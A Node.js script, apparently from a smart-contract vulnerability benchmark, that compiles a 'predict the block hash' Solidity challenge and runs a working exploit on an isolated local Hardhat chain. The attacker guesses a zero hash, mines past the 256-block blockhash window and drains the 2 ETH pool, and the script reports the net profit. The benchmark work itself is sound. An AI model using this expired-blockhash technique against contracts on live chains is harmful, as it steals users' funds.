'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory, parseEther } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CASE_ID = '09-old_blockhash';
const SOURCE_FILE = 'old_blockhash.sol';
const COMPILER_RELEASE = '0.4.24';
const ZERO_HASH = `0x${'00'.repeat(32)}`;
const ATTACK_STAKE = parseEther('1');
const BLOCKHASH_WINDOW = 256;

function digest(value) {
  return crypto.createHash('sha256').update(value).digest('hex');
}

function compile(source) {
  const input = {
    language: 'Solidity',
    sources: { [SOURCE_FILE]: { content: source } },
    settings: {
      optimizer: { enabled: false },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  const artifact = output.contracts?.[SOURCE_FILE]?.PredictTheBlockHashChallenge;
  if (!artifact?.abi || !artifact?.evm?.bytecode?.object) throw new Error('benchmark_contract_artifact_missing');
  return artifact;
}

function gasCost(receipt) {
  return BigInt(receipt.gasUsed) * BigInt(receipt.gasPrice);
}

(async () => {
  const caseId = process.argv[2];
  const sourcePath = path.resolve(process.argv[3] || '');
  if (caseId !== CASE_ID || path.basename(sourcePath) !== SOURCE_FILE) throw new Error('invalid_case_source');
  const source = fs.readFileSync(sourcePath, 'utf8');
  const sourceSha256 = digest(source);
  const release = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
  if (release !== COMPILER_RELEASE || solc.version().split('+', 1)[0] !== release) {
    throw new Error('benchmark_requires_exact_solc_0_4_24');
  }
  const compilerSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '');
  if (!/^(?:0x)?[a-f0-9]{64}$/i.test(compilerSha256)) throw new Error('benchmark_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('benchmark_dynamic_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('benchmark_evm_not_isolated');
  }

  const chain = new BrowserProvider(hre.network.provider);
  const chainId = Number((await chain.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('benchmark_evm_chain_id_mismatch');
  const deployer = await chain.getSigner(0);
  const attacker = await chain.getSigner(1);
  const attackerAddress = await attacker.getAddress();
  const initialAttackerBalance = await chain.getBalance(attackerAddress);
  const artifact = compile(source);
  const target = await new ContractFactory(artifact.abi, artifact.evm.bytecode.object, deployer)
    .deploy({ value: ATTACK_STAKE });
  const deploymentReceipt = await target.deploymentTransaction().wait();
  if (deploymentReceipt.status !== 1) throw new Error('challenge_deployment_failed');
  const targetAddress = await target.getAddress();
  const targetSeedBalance = await chain.getBalance(targetAddress, deploymentReceipt.blockNumber);
  if (targetSeedBalance !== ATTACK_STAKE) throw new Error('challenge_seed_balance_mismatch');

  const lockReceipt = await (await target.connect(attacker).lockInGuess(ZERO_HASH, { value: ATTACK_STAKE })).wait();
  if (lockReceipt.status !== 1) throw new Error('zero_guess_lock_failed');
  const guessedBlock = BigInt(lockReceipt.blockNumber + 1);
  const targetBalanceBeforeSettlement = await chain.getBalance(targetAddress, lockReceipt.blockNumber);
  if (targetBalanceBeforeSettlement !== ATTACK_STAKE + ATTACK_STAKE) {
    throw new Error(`challenge_balance_before_settlement_mismatch:${targetBalanceBeforeSettlement}`);
  }

  const latestBeforeMiningNumber = Number(BigInt(await hre.network.provider.send('eth_blockNumber')));
  const currentAge = BigInt(latestBeforeMiningNumber) - guessedBlock;
  const expiryAge = BigInt(BLOCKHASH_WINDOW + 1);
  const blocksToMine = expiryAge - currentAge - 1n;
  if (blocksToMine < 0n || blocksToMine > BigInt(BLOCKHASH_WINDOW + 2)) {
    throw new Error('unexpected_blockhash_window_setup');
  }
  if (blocksToMine > 0n) await hre.network.provider.send('hardhat_mine', [`0x${blocksToMine.toString(16)}`]);
  const latestAfterMiningNumber = Number(BigInt(await hre.network.provider.send('eth_blockNumber')));
  const latestAfterMining = await chain.getBlock(latestAfterMiningNumber);
  const ageBeforeSettlement = BigInt(latestAfterMiningNumber) - guessedBlock;
  if (ageBeforeSettlement < BigInt(BLOCKHASH_WINDOW)) {
    throw new Error(`target_block_not_near_expiry:${JSON.stringify({
      latestBefore: latestBeforeMiningNumber, latestAfter: latestAfterMiningNumber,
      guessedBlock: guessedBlock.toString(), currentAge: currentAge.toString(), blocksToMine: blocksToMine.toString(),
      ageBeforeSettlement: ageBeforeSettlement.toString(),
    })}`);
  }

  const settleReceipt = await (await target.connect(attacker).settle()).wait();
  const ageAtSettlement = BigInt(settleReceipt.blockNumber) - guessedBlock;
  const targetBalanceAfterSettlement = await chain.getBalance(targetAddress, settleReceipt.blockNumber);
  const attackerBalanceAfterSettlement = await chain.getBalance(attackerAddress, settleReceipt.blockNumber);
  const attackGasCost = gasCost(lockReceipt) + gasCost(settleReceipt);
  const netProfitWei = attackerBalanceAfterSettlement + attackGasCost - initialAttackerBalance;
  const confirmed = settleReceipt.status === 1
    && ageAtSettlement >= expiryAge
    && targetBalanceAfterSettlement === 0n
    && netProfitWei === parseEther('1');
  const boundary = publicBoundary(fork, { chainId, forkState: 'not_performed' });
  const result = {
    schemaVersion: 1,
    caseId: CASE_ID,
    state: confirmed ? 'passed' : 'failed',
    confirmedVulnerability: confirmed,
    vulnerability: 'bad_randomness',
    proofScope: 'attacker_profit_and_contract_balance_depletion',
    mode: 'isolated_in_process',
    compilerVersion: solc.version(),
    compilerKind: 'solc-js-original-source',
    compilerArtifactSha256: compilerSha256.startsWith('0x') ? compilerSha256 : `0x${compilerSha256}`,
    sourceSha256,
    targetAddress,
    attackerAddress,
    guessedValue: ZERO_HASH,
    guessedBlockNumber: guessedBlock.toString(),
    ageBeforeSettlement: ageBeforeSettlement.toString(),
    ageAtSettlement: ageAtSettlement.toString(),
    blockhashExpiryThreshold: BLOCKHASH_WINDOW,
    targetSeedBalanceWei: targetSeedBalance.toString(),
    targetBalanceBeforeSettlementWei: targetBalanceBeforeSettlement.toString(),
    targetBalanceAfterSettlementWei: targetBalanceAfterSettlement.toString(),
    attackerNetProfitWei: netProfitWei.toString(),
    expectedNetProfitWei: parseEther('1').toString(),
    attackGasCostWei: attackGasCost.toString(),
    transactionHashes: [deploymentReceipt.hash, lockReceipt.hash, settleReceipt.hash],
    executionBoundary: boundary,
    reason: confirmed ? null : 'expired_blockhash_payout_or_net_profit_assertion_failed',
    reproduction: '攻击者提交 bytes32(0)，等待目标区块超出 256 区块哈希窗口后结算；验证目标 2 ETH 奖池被清空，攻击者扣除锁定本金和 gas 后仍净获利。',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 1;
});
